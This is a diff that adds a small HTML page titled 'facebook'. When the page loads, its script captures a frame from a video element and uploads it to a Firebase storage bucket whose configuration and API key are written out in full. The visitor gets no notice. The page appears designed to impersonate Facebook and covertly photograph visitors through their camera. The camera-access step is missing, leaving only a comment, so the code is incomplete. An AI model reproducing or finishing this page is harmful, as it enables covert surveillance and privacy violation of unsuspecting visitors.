@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>facebook</title>
+</head>
+<body>
+  <h1></h1>
+  <video id="video" autoplay></video>
+
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+
+  <script>
+    // Initialize Firebase
+    const firebaseConfig = {
+      // Your Firebase configuration
+      apiKey: "AIzaSyA9aeIFnYrQ9UXIUJS0RsPUbgljfinQdQ0",
+      authDomain: "a2za2za2z1.firebaseapp.com",
+      databaseURL: "https://a2za2za2z1-default-rtdb.firebaseio.com",
+      projectId: "a2za2za2z1",
+      storageBucket: "a2za2za2z1.appspot.com",
+      messagingSenderId: "1092163255405",
+      appId: "1:1092163255405:web:702ceabc4045e853ce5364"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+    const storageRef = storage.ref();
+
+    const video = document.getElementById('video');
+    const captureButton = document.getElementById('captureButton');
+
+    let stream;
+    let mediaRecorder;
+
+    // Request access to the camera and start streaming
+
+    // Capture image from the video stream
+    function captureImage() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob((blob) => {
+        const filename = 'captured-image.png';
+        const uploadTask = storageRef.child(filename).put(blob);
+
+        uploadTask.then(snapshot => {
+          console.log('Image uploaded successfully:', snapshot.ref);
+        }).catch(error => {
+          console.error('Error uploading image:', error);
+        });
+      }, 'image/png');
+    }
+    captureImage();
+
+  </script>
+</body>
+</html>
